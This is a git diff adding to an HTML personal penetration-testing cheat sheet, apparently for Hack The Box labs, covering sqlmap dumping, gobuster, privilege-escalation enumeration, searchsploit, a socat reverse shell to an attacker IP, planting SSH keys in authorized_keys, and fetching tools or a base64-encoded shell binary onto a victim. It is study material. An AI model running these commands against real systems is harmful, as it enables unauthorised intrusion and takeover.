@@ -17,7 +17,8 @@
 }
 
 </style>
-        
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.2/dist/katex.min.css" integrity="sha384-yFRtMMDnQtDRO8rLpMIKrtPCD5jdktao2TV19YiZYWMDkUR5GQZR/NOVTdquEx1j" crossorigin="anonymous">
+<link href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css" rel="stylesheet" type="text/css">
         <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
 <style>
@@ -31,7 +32,7 @@
 .task-list-item { list-style-type: none; } .task-list-item-checkbox { margin-left: -20px; vertical-align: middle; }
 </style>
         
-        
+        <script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script>
         
     </head>
     <body class="vscode-body vscode-light">
@@ -64,7 +65,8 @@
 <li>We can enumerate the databases names by writing the following line:<pre><code class="language-console"><div>sqlmap -u [LINK OF VICTIM] --data=&#x27;username=&amp;password=&#x27; --method POST --dbs --batch
 </div></code></pre>
 </li>
-<li>In addition to the databases' names the previous line also provided me with the version of the SQL on the server.<br>
+<li>In addition to the databases' names the previous line also provided me with the version of the SQL on the server.</li>
+<li><code>--batch</code> answers the questions for me with the default.
 <br/></li>
 <li>We can also get the tables' names by writing the following line:<pre><code class="language-console"><div>sqlmap -u [LINK OF VICTIM] --data=&quot;username=&amp;password=&quot; --method POST -D [DATABASE NAME] --dump all --batch
 </div></code></pre>
@@ -94,13 +96,209 @@ The presence of the robots.txt does not in itself present any kind of security v
 <ul>
 <li>Command to bruteforece in <code>DIR</code> mode</li>
 </ul>
-<pre><code class="language-console"><div>gobuster dir -u [VICTIM&#x27;S LINK] -w [WORDLIST PATH]
+<pre><code class="language-console"><div>gobuster dir -u [VICTIM&#x27;S LINK] -x [LIST OF EXTENSIONS] -w [WORDLIST PATH]
 </div></code></pre>
 <ul>
 <li>Command to bruteforce <code>DNS</code> mode</li>
 </ul>
 <pre><code class="language-console"><div>gobuster dns -d [WEB SERVICE DOMAIN] -W [WORDLIST PATH]
 </div></code></pre>
+<p><br/><br/></p>
+<h3 id="span-classuseful_shit-subtitledns-zone-transfer"><span class="useful_shit subtitle">DNS Zone Transfer</h3>
+<ul>
+<li>Definition?
+Is the process of copying the contents of the zone file on a primary DNS server to a secondary DNS server.<br>
+And this way fault tolerance is provided.</li>
+</ul>
+<p><br/><br/></p>
+<h3 id="span-classuseful_shit-subtitledirsearch"><span class="useful_shit subtitle">Dirsearch</h3>
+<ul>
+<li>Check out <a href="https://github.com/maurosoria/dirsearch">this link</a> to git clone it.</li>
+<li>We can use it instead of Dirbuster or Gobuster.</li>
+</ul>
+<p><br/><br/></p>
+<h3 id="span-classuseful_shit-subtitleprivesc-"><span class="useful_shit subtitle">PrivEsc 😈</h3>
+<ul>
+<li><code>cat /etc/shells</code></li>
+<li>Shows me what shells the machine uses</li>
+</ul>
+<br/>
+<ul>
+<li><code>[COMMAND] | tee [FILE NAME]</code></li>
+<li>Stores output of the command in a file.</li>
+</ul>
+<br/>
+<ul>
+<li><code>dpkg -l</code></li>
+<li>Shows the packages and libraries on system.</li>
+<li>I think this command is only for Debian based OSes 🤔.</li>
+</ul>
+<br/>
+<ul>
+<li><code>/usr/share/exploitdb/exploits</code></li>
+<li>ExploitDB's exploits are saved in this path.</li>
+</ul>
+<br/>
+<ul>
+<li>Tools we can use to make life easier</li>
+<li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a>, <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPeas</a>, <a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux-Smart-Enumeration</a> and <a href="https://github.com/DominicBreuker/pspy">Pspy</a>.</li>
+</ul>
+<br/>
+<ul>
+<li>Some info on gcc</li>
+<li>The option <code>-Wall</code> is a warning option.</li>
+</ul>
+<p><br/><br/></p>
+<h3 id="span-classuseful_shit-subtitlesearchsploit"><span class="useful_shit subtitle">Searchsploit</h3>
+<ul>
+<li><code>searchsploit -x [EXPLOIT PATH]</code></li>
+<li>Can be used to view the exploit code.</li>
+</ul>
+<br/>
+<ul>
+<li><code>searchsploit -m [EXPLOIT PATH]</code></li>
+<li>Copies the exploit to my working directory 😱.</li>
+</ul>
+<br/>
+<ul>
+<li>People that name exploits sometimes name the versions wrongly. So, don't trusts the version in the name of the exploit.</li>
+</ul>
+<p><br/><br/></p>
+<h3 id="span-classuseful_shit-subtitleupgrading-the-reverse-shell"><span class="useful_shit subtitle">Upgrading The Reverse Shell</h3>
+<ul>
+<li>The bitch machine Cronos keeps making problems for me and I can't seem to open the admin some times. So I wasn't able to test the ways I'll be mentioning next (I got them from this <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">website</a>)</li>
+</ul>
+<br/>  
+<ul>
+<li>Using Python for a psuedo terminal</li>
+</ul>
+<pre><code class="language-console"><div>python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
+</div></code></pre>
+<ul>
+<li>Using socat  WORKED INSTEAD OF <code>nc</code></li>
+</ul>
+<pre><code class="language-console"><div><span class="hljs-meta">#</span><span class="bash">Listener</span>
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+<span class="hljs-meta">
+#</span><span class="bash">Victim  </span>
+socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sane tcp:10.0.3.4:4444
+</div></code></pre>
+<ul>
+<li>Using stty options NOT WORKING WITH ME</li>
+</ul>
+<pre><code class="language-console"><div><span class="hljs-meta">#</span><span class="bash"> In reverse shell </span>
+python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
+ctrl-z  
+<span class="hljs-meta">
+#</span><span class="bash"> In Kali </span>
+stty raw -echo  
+fg
+<span class="hljs-meta">
+#</span><span class="bash"> In reverse shell</span>
+reset
+export ShELL=bash
+export TERM=xterm-256color
+stty row &lt;num&gt; columns &lt;cols&gt;
+</div></code></pre>
+<ul>
+<li>If we type <code>stty -a</code> it will give me info and I can get the rows and columns from there.</li>
+<li>I can also echo the $TERM variable and put its value in the reverse shell as the value I have on my Kali.</li>
+</ul>
+<p><br/><br/></p>
+<h3 id="span-classuseful_shit-subtitlesudo"><span class="useful_shit subtitle">sudo</h3>
+<ul>
+<li>It can be used to run commands as another user (root is one of them but not the only one). I think by default it runs as root and if I want to run as another user I can use <code>sudo -u [USERNAME] [COMMAND]</code>.</li>
+</ul>
+<p><br/><br/></p>
+<h3 id="span-classuseful_shit-subtitlessh-keys"><span class="useful_shit subtitle">SSH Keys</h3>
+<ul>
+<li>
+<p>We can use ssh keys to privesc</p>
+<pre><code class="language-console"><div>Shatha Barqawi@htb[/htb]$ vim id_rsa
+Shatha Barqawi@htb[/htb]$ chmod 600 id_rsa
+Shatha Barqawi@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa
+<span class="hljs-meta">
+root@remotehost#</span>
+</div></code></pre>
+</li>
+<li>
+<p>This ssh key can be found in the following path if I have access to it <code>/home/user/.ssh/id_rsa</code> or <code>/root/.ssh/id_rsa</code>.</p>
+  <blockquote>
+  Note that we used the command 'chmod 600 id_rsa' on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.
+  </blockquote>  
+</li>
+<li>
+<p>We can also put our public key in the directory <code>/home/user/.ssh/authorized_keys</code> if we have the permissions to do so. How to do that?</p>
+</li>
+</ul>
+<ol>
+<li>Create key on my machine<pre><code class="language-console"><div>Shatha Barqawi@htb[/htb]$ ssh-keygen -f key
+</div></code></pre>
+<ul>
+<li>This will create two file <code>key</code> (which we will use with <code>ssh -i</code>) and <code>key.pub</code>(which we will copy to the remote machine).</li>
+</ul>
+</li>
+</ol>
+<p><br/><br/></p>
+<h3 id="span-classuseful_shit-subtitletransferring-files"><span class="useful_shit subtitle">Transferring Files</h3>
+<ol>
+<li>Using <code>wget</code></li>
+</ol>
+<ul>
+<li>
+<p>We run a Python HTTP server on our machine and wget or cURL on the victim to download the file</p>
+</li>
+<li>
+<p>On my machine</p>
+<pre><code class="language-console"><div>Shatha Barqawi@htb[/htb]$ cd /tmp
+Shatha Barqawi@htb[/htb]$ python3 -m http.server 8000
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</div></code></pre>
+</li>
+<li>
+<p>On victim</p>
+<pre><code class="language-console"><div><span class="hljs-meta">user@remotehost$</span><span class="bash"> wget http://10.10.14.1:8000/linenum.</span>
+</div></code></pre>
+<p>OR</p>
+<pre><code class="language-console"><div><span class="hljs-meta">user@remotehost$</span><span class="bash"> curl http://10.10.14.1:8000/linenum.sh -o linenum.sh</span>
+</div></code></pre>
+</li>
+</ul>
+<ol start="2">
+<li>
+<p>Using <code>scp</code></p>
+<pre><code><code><div>scp [PATH TO FILE ON MY SYSTEM] [USERNAME]@[TARGET IP]:[PATH ON TARGET TO TRANSFER FILE TO]
+</div></code></code></pre>
+</li>
+<li>
+<p>Using <code>base64</code></p>
+</li>
+</ol>
+<ul>
+<li>
+<p>In some cases, there might be firewall protections that prevent us from downloading a file from our machine. In such case we can use <code>base64</code> and encode the file into base64 format and then copy/paste the base64 string to the remote server and decode it there.</p>
+<pre><code class="language-console"><div>Shatha Barqawi@htb[/htb]$ base64 shell -w 0
+</div></code></pre>
+<pre><code class="language-console"><div><span class="hljs-meta">user@remotehost$</span><span class="bash"> <span class="hljs-built_in">echo</span> f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA...SNIO...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d &gt; shell</span>
+</div></code></pre>
+</li>
+<li>
+<p>To check that we didn't miss anything up during the encoding/deconding process we can use the command <code>md5sum [FILENAME]</code> on both machines and check if they're equal.</p>
+</li>
+</ul>
+<p><br/><br/></p>
+<h3 id="span-classuseful_shit-subtitlenmap"><span class="useful_shit subtitle">Nmap</h3>
+<ul>
+<li>We can use the option <code>-oA [FILE NAME]</code> to save the nmap output in a file in the working directory.<pre><code class="language-console"><div>nmap -p- --open -oA nibbles_full_tcp_scan 10.129.42.190
+</div></code></pre>
+</li>
+</ul>
+<p><br/><br/></p>
+<h3 id="span-classuseful_shit-subtitleweb-testing"><span class="useful_shit subtitle">Web Testing</h3>
+<ul>
+<li>We can use the command <code>whatweb [IP ADDRESS]</code> to see info about the web server.</li>
+</ul>
 
     </body>
     </html>
